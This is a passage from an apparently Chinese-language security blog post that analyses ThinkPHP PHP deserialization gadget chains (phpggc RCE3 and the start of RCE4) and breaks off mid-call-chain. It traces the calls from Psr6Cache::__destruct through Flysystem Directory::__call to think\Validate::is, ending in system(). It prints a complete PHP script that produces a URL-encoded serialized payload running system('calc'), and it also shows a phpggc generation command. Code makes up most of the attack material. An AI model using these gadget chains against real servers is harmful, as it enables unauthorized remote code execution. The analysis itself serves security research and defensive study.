class="keyword">protected</span>] =&gt; <span class="title function_ invoke__">Array</span></span><br><span class="line">        (</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">)</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>反序列化调用链</strong> ：</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">League\Flysystem\Cached\Storage\Psr6Cache-&gt;<span class="title function_ invoke__">__destruct</span>()</span><br><span class="line">└── <span class="title function_ invoke__">save</span>()</span><br><span class="line">    └── <span class="variable language_">$this</span>-&gt;pool-&gt;<span class="title function_ invoke__">getItem</span>(<span class="variable">$this</span>-&gt;key)                      <span class="comment">// ✅ $this-&gt;pool = Directory1，无 getItem 方法</span></span><br><span class="line">        └── <span class="built_in">Directory</span>-&gt;<span class="title function_ invoke__">__call</span>(<span class="string">&quot;getItem&quot;</span>, [<span class="variable">$this</span>-&gt;key])        <span class="comment">// ✅ 第一次 __call</span></span><br><span class="line"></span><br><span class="line">League\Flysystem\<span class="built_in">Directory</span>-&gt;<span class="title function_ invoke__">__call</span>(<span class="string">&quot;getItem&quot;</span>, [<span class="variable">$this</span>-&gt;key])</span><br><span class="line">└── <span class="title function_ invoke__">array_unshift</span>(<span class="variable">$arguments</span>, <span class="variable">$this</span>-&gt;path)                    <span class="comment">// ✅ $arguments = [$path1, $key]</span></span><br><span class="line">└── <span class="title function_ invoke__">call_user_func_array</span>([<span class="variable">$this</span>-&gt;filesystem, <span class="string">&quot;getItem&quot;</span>], [<span class="variable">$path1</span>, <span class="variable">$key</span>])</span><br><span class="line">    └── <span class="built_in">Directory</span>-&gt;<span class="title function_ invoke__">__call</span>(<span class="string">&quot;getItem&quot;</span>, [<span class="variable">$path1</span>, <span class="variable">$key</span>])          <span class="comment">// ✅ 第二次 __call（filesystem = Directory2）</span></span><br><span class="line"></span><br><span class="line">League\Flysystem\<span class="built_in">Directory</span>-&gt;<span class="title function_ invoke__">__call</span>(<span class="string">&quot;getItem&quot;</span>, [<span class="variable">$path1</span>, <span class="variable">$key</span>])</span><br><span class="line">└── <span class="title function_ invoke__">array_unshift</span>(<span class="variable">$arguments</span>, <span class="variable">$this</span>-&gt;path)                    <span class="comment">// ✅ $arguments = [$path2, $path1, $key]</span></span><br><span class="line">└── <span class="title function_ invoke__">call_user_func_array</span>([<span class="variable">$this</span>-&gt;filesystem, <span class="string">&quot;getItem&quot;</span>], [<span class="variable">$path2</span>, <span class="variable">$path1</span>, <span class="variable">$key</span>])</span><br><span class="line">    └── think\Validate-&gt;<span class="title function_ invoke__">__call</span>(<span class="string">&quot;getItem&quot;</span>, [<span class="variable">$path2</span>, <span class="variable">$path1</span>, <span class="variable">$key</span>])</span><br><span class="line"></span><br><span class="line">think\Validate-&gt;<span class="title function_ invoke__">__call</span>(<span class="string">&quot;getItem&quot;</span>, [<span class="variable">$path2</span>, <span class="variable">$path1</span>, <span class="variable">$key</span>])</span><br><span class="line">└── <span class="title function_ invoke__">array_push</span>(<span class="variable">$args</span>, <span class="string">&#x27;getItem&#x27;</span>)                              <span class="comment">// ✅ $args = [$path2, $path1, $key, &#x27;getItem&#x27;]</span></span><br><span class="line">└── <span class="title function_ invoke__">call_user_func_array</span>([<span class="variable">$this</span>, <span class="string">&#x27;is&#x27;</span>], [<span class="variable">$path2</span>, <span class="variable">$path1</span>, <span class="variable">$key</span>, <span class="string">&#x27;getItem&#x27;</span>])</span><br><span class="line"></span><br><span class="line">think\Validate-&gt;<span class="title function_ invoke__">is</span>(<span class="variable">$value</span> = <span class="variable">$path2</span>, <span class="variable">$rule</span> = <span class="variable">$path1</span>, <span class="variable">$data</span> = <span class="variable">$key</span>)</span><br><span class="line">└── <span class="variable">$data</span> 类型必须为 <span class="keyword">array</span>                                    <span class="comment">// ✅ 否则触发 TypeError</span></span><br><span class="line">└── <span class="keyword">switch</span> (<span class="title class_">Str</span>::<span class="title function_ invoke__">camel</span>(<span class="variable">$rule</span>)) → <span class="keyword">default</span></span><br><span class="line">└── <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;type[<span class="variable">$rule</span>]) → <span class="literal">true</span>                          <span class="comment">// ✅ $this-&gt;type[$path1] = &#x27;system&#x27;</span></span><br><span class="line">└── <span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$this</span>-&gt;type[<span class="variable">$rule</span>], [<span class="variable">$value</span>])        <span class="comment">// ✅ system($path2)</span></span><br></pre></td></tr></table></figure></div></li>
</ul>
<h3 id="调用链分析-2"><a href="#调用链分析-2" class="headerlink" title="调用链分析"></a>调用链分析</h3><p><code>League\Flysystem\Cached\Storage\Psr6Cache</code> 类继承于 <code>League\Flysystem\Cached\Storage\AbstractCache</code>，因此析构的时候调用的是 <code>AbstractCache-&gt;__destruct</code> 函数。</p>
<p>在该 <code>__destruct</code> 函数中，如果 <code>AbstractCache</code> 的 <code>$autosave</code> 属性值为 <code>false</code>，则会调用到 <code>Psr6Cache-&gt;save</code> 函数。</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Destructor.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (! <span class="variable language_">$this</span>-&gt;autosave) &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">save</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>Psr6Cache-&gt;save</code> 函数会调用 <code>$this-&gt;pool</code> 的 <code>getItem</code> 方法，参数为 <code>$this-&gt;key</code>。</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * &#123;<span class="doctag">@inheritdoc</span>&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$item</span> = <span class="variable language_">$this</span>-&gt;pool-&gt;<span class="title function_ invoke__">getItem</span>(<span class="variable">$this</span>-&gt;key);</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>由于我们设置 <code>$this-&gt;pool</code> 为 <code>League\Flysystem\Directory</code> 对象，该对象没有 <code>getItem</code> 方法，因此会调用到 <code>Directory</code> 实现的抽象类 <code>League\Flysystem\Handler</code> 的 <code>__call</code> 方法。</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Plugins pass-through.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $method = &quot;getItem&quot;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> array  $arguments = Psr6Cache-&gt;key</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="keyword">array</span> <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 将 $this-&gt;path 插入到 $arguments 数组头部</span></span><br><span class="line">    <span class="title function_ invoke__">array_unshift</span>(<span class="variable">$arguments</span>, <span class="variable">$this</span>-&gt;path);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 构造一个回调，用于调用 $this-&gt;filesystem 的 $method 方法</span></span><br><span class="line">    <span class="variable">$callback</span> = [<span class="variable language_">$this</span>-&gt;filesystem, <span class="variable">$method</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 调用构造的回调，并传入 $arguments 数组</span></span><br><span class="line">        <span class="comment">// 也就是 [Directory-&gt;path, Psr6Cache-&gt;key]</span></span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$callback</span>, <span class="variable">$arguments</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="built_in">BadMethodCallException</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这个函数主要功能是在 <code>$this</code> 自身没有 <code>$method</code> 方法的情况下调用 <code>$this-&gt;filesystem</code> 的 <code>$method</code> 方法，而参数方面则在原始参数的基础上将 <code>$this-&gt;path</code> 插到第一个参数上，也就是 <code>[Directory-&gt;path, Psr6Cache-&gt;key]</code>。</p>
<p>由于 <code>$this-&gt;filesystem</code> 是我们可控的，因此<strong>我们可以调用任意对象的 <code>getItem</code>（或者是 <code>__call</code>）方法，并且有两个可控参数</strong>。</p>
<p>在 ThinkPHP 中有另一个 <code>think\Validate</code> 类，这个类的 <code>__call</code> 方法会调用类的 <code>is</code> 方法，同时参数传入<strong>原本的参数</strong>和<strong>经过转换后（按照小驼峰规则去掉 <code>is</code> 前缀）的方法名</strong>。</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 动态方法 直接调用is方法进行验证</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $method 方法名</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> array  $args   调用参数</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> bool</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 判断方法名 $method 是否以 &quot;is&quot; 开头（不区分大小写）</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&#x27;is&#x27;</span> == <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$method</span>, <span class="number">0</span>, <span class="number">2</span>))) &#123;</span><br><span class="line">        <span class="comment">// 去掉方法名 $method 中的 &quot;is&quot; 前缀，例如 isEmail -&gt; Email</span></span><br><span class="line">        <span class="variable">$method</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$method</span>, <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将方法名 $method 首字母小写后，作为验证规则添加到参数数组 $args 末尾</span></span><br><span class="line">    <span class="title function_ invoke__">array_push</span>(<span class="variable">$args</span>, <span class="title function_ invoke__">lcfirst</span>(<span class="variable">$method</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用本类中的 is() 方法，并传递参数（原本参数 $args + $method）</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">call_user_func_array</span>([<span class="variable">$this</span>, <span class="string">&#x27;is&#x27;</span>], <span class="variable">$args</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>而对于 <code>think\Validate</code> 类的 <code>is</code> 方法，如果前面的 <code>call_user_func_array</code> 的参数 <code>$args</code> 满足下面两个条件：</p>
<ul>
<li><p>第 2 个参数转换为小驼峰后不是 <code>require</code>, <code>accepted</code>, <code>date</code>, <code>activeUrl</code>，<code>boolean</code>, <code>bool</code>, <code>number</code>, <code>alphaNum</code>，<code>array</code>, <code>file</code>, <code>image</code>, <code>token</code> 中的任意一个。</p>
</li>
<li><p>第 3 个参数类型为数组。因为<strong>如果 <code>$args</code> 中的第三个参数不是数组类型</strong>，会出现 <strong>PHP 类型错误（TypeError）</strong></p>
<blockquote>
<p><strong>PHP 是弱类型语言</strong>，但从 <strong>PHP 7.0 起引入了“严格类型”提示机制（严格参数类型声明）</strong>。这里的 <code>array $data</code> 就是 <strong>参数类型强约束（type hinting）</strong>，不是“弱类型”的行为。</p>
</blockquote>
</li>
</ul>
<p><strong>就可以调用 <code>$this-&gt;type[$rule]</code> 指定的方法，并传入参数 <code>$value</code>。这里 <code>$rule</code> 和 <code>$value</code> 分别是前面 <code>__call</code> 传入的第 1、2 个参数。</strong></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 验证字段值是否为有效格式</span></span><br><span class="line"><span class="comment"> * @access public</span></span><br><span class="line"><span class="comment"> * @param mixed  $value 字段值</span></span><br><span class="line"><span class="comment"> * @param string $rule  验证规则</span></span><br><span class="line"><span class="comment"> * @param array  $data  数据</span></span><br><span class="line"><span class="comment"> * @return bool</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">public function <span class="title function_">is</span><span class="params">($value, <span class="built_in">string</span> $rule, <span class="built_in">array</span> $data = [])</span>: <span class="type">bool</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 将 $rule 下划线转小驼峰然后判断处理</span></span><br><span class="line">    <span class="keyword">switch</span> (Str::camel($rule)) &#123;</span><br><span class="line">        <span class="comment">// 确保不要进入下面其他几种分支：</span></span><br><span class="line">        <span class="comment">// require, accepted, date, activeUrl</span></span><br><span class="line">        <span class="comment">// boolean, bool, number, alphaNum</span></span><br><span class="line">        <span class="comment">// array, file, image, token</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">            </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">if</span> (isset($this-&gt;type[$rule])) &#123;</span><br><span class="line">                <span class="comment">// 调用 $this-&gt;type[$rule] 方法，参数为 $value 即第一个参数</span></span><br><span class="line">                $result = call_user_func_array($this-&gt;type[$rule], [$value]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>因此我们不难想到利用前面 <code>Directory</code> 的 <code>__call</code> 方法的 <code>call_user_func_array</code> 调用 <code>Validate</code> 类的 <code>__call</code> 方法来实现 RCE。</p>
<p>然而虽然 <code>Validate</code> 类没有 <code>getItem</code> 因此可以调到 <code>__call</code> 函数，但是 <code>Validate</code> 需要我们有 3 个参数可控，而我们利用 <code>Directory</code> 的 <code>__call</code> 方法调用过来只有 2 个参数可控，不满足利用条件。</p>
<p>不过我们观察到 <strong><code>Directory</code> 的 <code>__call</code> 方法在调用 <code>call_user_func_array</code> 之前会向参数列表的头部插入一个 <code>$this-&gt;path</code></strong> ，因此我们可以<strong>再调用一次 <code>Directory</code> 的 <code>__call</code> 方法确保参数数组中有 3 个值可控</strong>，然后再调用 <code>Validate</code> 类的 <code>__call</code> 方法来实现 RCE。</p>
<h3 id="利用脚本-2"><a href="#利用脚本-2" class="headerlink" title="利用脚本"></a>利用脚本</h3><div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Validate</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">type</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$function</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;type = [<span class="string">&quot;key&quot;</span> =&gt; <span class="variable">$function</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">League</span>\<span class="title class_">Flysystem</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Directory</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">filesystem</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$path</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$id</span>, <span class="variable">$function</span>, <span class="variable">$parameter</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$id</span> == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;filesystem = <span class="keyword">new</span> <span class="title class_">\League\Flysystem\Directory</span>(<span class="number">1</span>, <span class="variable">$function</span>, <span class="variable">$parameter</span>);</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;path = <span class="string">&quot;key&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;filesystem = <span class="keyword">new</span> \think\<span class="title function_ invoke__">Validate</span>(<span class="variable">$function</span>);</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;path = <span class="variable">$parameter</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">League</span>\<span class="title class_">Flysystem</span>\<span class="title class_">Cached</span>\<span class="title class_">Storage</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Psr6Cache</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">private</span> $<span class="title class_">pool</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$autosave</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$key</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$function</span>, <span class="variable">$parameter</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;autosave = <span class="literal">false</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;pool = <span class="keyword">new</span> <span class="title class_">\League\Flysystem\Directory</span>(<span class="number">0</span>, <span class="variable">$function</span>, <span class="variable">$parameter</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;key = [];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title class_">payload</span> = <span class="title class_">new</span> \<span class="title class_">League</span>\<span class="title class_">Flysystem</span>\<span class="title class_">Cached</span>\<span class="title class_">Storage</span>\<span class="title class_">Psr6Cache</span>(&quot;<span class="title class_">system</span>&quot;, &quot;<span class="title class_">calc</span>&quot;);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$payload</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="RCE4（影响-6-0-1-）"><a href="#RCE4（影响-6-0-1-）" class="headerlink" title="RCE4（影响 6.0.1+）"></a>RCE4（影响 6.0.1+）</h2><h3 id="基本信息-3"><a href="#基本信息-3" class="headerlink" title="基本信息"></a>基本信息</h3><ul>
<li><p><strong>影响范围</strong> ：6.0.1+</p>
</li>
<li><p><strong>生成命令</strong> ：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpggc ThinkPHP/RCE4 system <span class="built_in">id</span> -b -u</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>反序列化对象</strong> ：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/07/28/ThinkPHP%20%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8/images/TPRCE4.svg"
                      alt="TPRCE4"
                ></p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">think\model\Pivot <span class="title function_ invoke__">Object</span></span><br><span class="line">(</span><br><span class="line">    [<span class="attr">exists</span>:think\<span class="attr">Model</span>:<span class="keyword">private</span>] =&gt; <span class="number">1</span></span><br><span class="line">    [<span class="attr">force</span>:think\<span class="attr">Model</span>:<span class="keyword">private</span>] =&gt; <span class="number">1</span></span><br><span class="line">    [<span class="attr">lazySave</span>:think\<span class="attr">Model</span>:<span class="keyword">private</span>] =&gt; <span class="number">1</span></span><br><span class="line">    [<span class="attr">data</span>:think\<span class="attr">Model</span>:<span class="keyword">private</span>] =&gt; <span class="title function_ invoke__">Array</span></span><br><span class="line">        (</span><br><span class="line">            [<span class="number">0</span>] =&gt; <span class="number">0</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    [<span class="attr">suffix</span>:<span class="keyword">protected</span>] =&gt; think\model\Pivot <span class="title function_ invoke__">Object</span></span><br><span class="line">        (</span><br><span class="line">            [<span class="attr">data</span>:think\<span class="attr">Model</span>:<span class="keyword">private</span>] =&gt; <span class="title function_ invoke__">Array</span></span><br><span class="line">                (</span><br><span class="line">                    [key] =&gt; <span class="title function_ invoke__">Array</span></span><br><span class="line">                        (</span><br><span class="line">                            [key] =&gt; calc</span><br><span class="line">                        )</span><br><span class="line"></span><br><span class="line">                )</span><br><span class="line"></span><br><span class="line">            [<span class="attr">withAttr</span>:think\<span class="attr">Model</span>:<span class="keyword">private</span>] =&gt; <span class="title function_ invoke__">Array</span></span><br><span class="line">                (</span><br><span class="line">                    [key] =&gt; <span class="title function_ invoke__">Array</span></span><br><span class="line">                        (</span><br><span class="line">                            [key] =&gt; system</span><br><span class="line">                        )</span><br><span class="line"></span><br><span class="line">                )</span><br><span class="line"></span><br><span class="line">            [<span class="attr">json</span>:<span class="keyword">protected</span>] =&gt; <span class="title function_ invoke__">Array</span></span><br><span class="line">                (</span><br><span class="line">                    [<span class="number">0</span>] =&gt; key</span><br><span class="line">                )</span><br><span class="line"></span><br><span class="line">            [<span class="attr">jsonAssoc</span>:<span class="keyword">protected</span>] =&gt; <span class="number">1</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    [<span class="attr">withEvent</span>:<span class="keyword">protected</span>] =&gt; </span><br><span class="line">)</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>反序列化调用链</strong> ：</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">think\model\Pivot-&gt;<span class="title function_ invoke__">__destruct</span>()</span><br><span class="line">└── <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;lazySave)                                         <span class="comment">// ✅ $this-&gt;lazySave = true，进入判断</span></span><br><span class="line">    └── <span class="title function_ invoke__">save</span>(<span class="keyword">array</span> <span class="variable">$data</span> = [], <span class="keyword">string</span> <span class="variable">$sequence</span> = <span class="literal">null</span>): <span class="keyword">bool</span></span><br><span class="line">        └── <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">setAttrs</span>([])                                  <span class="comment">// ✅ 空数组，无属性被设置</span></span><br><span class="line">        └── <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">isEmpty</span>() || <span class="literal">false</span> === <span class="variable language_">$this</span>-&gt;<span class="title function_ 